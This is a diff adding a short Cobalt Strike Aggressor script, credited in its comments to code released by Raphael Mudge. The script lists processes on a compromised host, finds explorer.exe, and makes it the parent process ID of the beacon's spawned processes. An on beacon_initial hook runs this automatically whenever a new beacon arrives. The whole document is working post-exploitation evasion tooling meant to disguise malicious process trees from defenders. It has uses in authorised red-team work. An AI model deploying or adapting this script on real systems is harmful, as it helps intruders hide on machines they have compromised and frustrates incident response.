@@ -1,0 +1,30 @@
+# Raphael Mudge released code to search for explorer.exe and set it as a Parent PID.
+# https://www.cobaltstrike.com/aggressor-script/functions.html#bppid
+# 
+# Just add on_initial to make it do it on arrival.
+
+# getexplorerpid($bid, &callback);
+sub getexplorerpid {
+	bps($1, lambda({
+		local('$pid $name $entry');
+		foreach $entry (split("\n", $2)) {
+			($name, $null, $pid) = split("\\s+", $entry);
+			if ($name eq "explorer.exe") {
+				[$callback: $1, $pid];
+			}
+		}
+	}, $callback => $2));
+}
+
+alias prepenv {
+	btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
+	getexplorerpid($1, {
+		bppid($1, $2);
+	});
+}
+
+on beacon_initial {
+
+	fireAlias($1, "prepenv");
+
+}
